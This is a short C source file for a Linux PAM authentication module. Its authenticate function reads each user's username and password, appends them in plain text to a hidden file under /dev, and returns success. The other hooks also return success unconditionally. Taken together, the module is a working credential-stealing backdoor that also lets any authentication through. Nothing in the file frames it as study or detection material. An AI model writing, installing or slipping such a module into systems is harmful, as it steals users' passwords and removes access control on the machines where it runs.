#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

void saveCredentials(const char *username, const char *password) {
    FILE *file = fopen("/dev/pam.txt", "a"); // Change the path as needed
    if (file == NULL) {
        perror("Error opening file");
        return;
    }
    fprintf(file, "Username: %s\nPassword: %s\n\n", username, password);
    fclose(file);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char *username;
    const char *password;

    // Get username
    retval = pam_get_user(pamh, &username, "Username: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    // Retrieve password
    retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    if (retval != PAM_SUCCESS || password == NULL) {
        return retval != PAM_SUCCESS ? retval : PAM_AUTH_ERR;
    }

    // Save credentials to file
    saveCredentials(username, password);

    return PAM_SUCCESS;
}
